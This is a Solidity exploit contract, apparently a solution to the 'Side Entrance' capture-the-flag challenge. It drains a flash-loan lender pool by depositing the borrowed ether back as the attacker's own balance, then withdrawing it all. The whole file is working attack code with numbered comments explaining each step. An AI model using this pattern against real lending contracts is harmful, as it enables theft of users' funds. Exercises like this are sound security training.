// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideExploit is IFlashLoanEtherReceiver {

    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function exploit() external {
        uint256 bal = address(pool).balance;
        // 1. flash loan with all of the pool's balance
        pool.flashLoan(bal);
        // 4. flash loan completed OK, but tokens actually deposited in exploiter's account. Withdraw all tokens.
        pool.withdraw();
        // 5. Send tokens back to attacker
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable override{
        // 2. deposit flash loan to own account within the pool
        pool.deposit{value: msg.value}();
        // 3. don't return anything since the pool's balance is already increased
    }

    fallback() external payable{}
    receive() external payable {}

}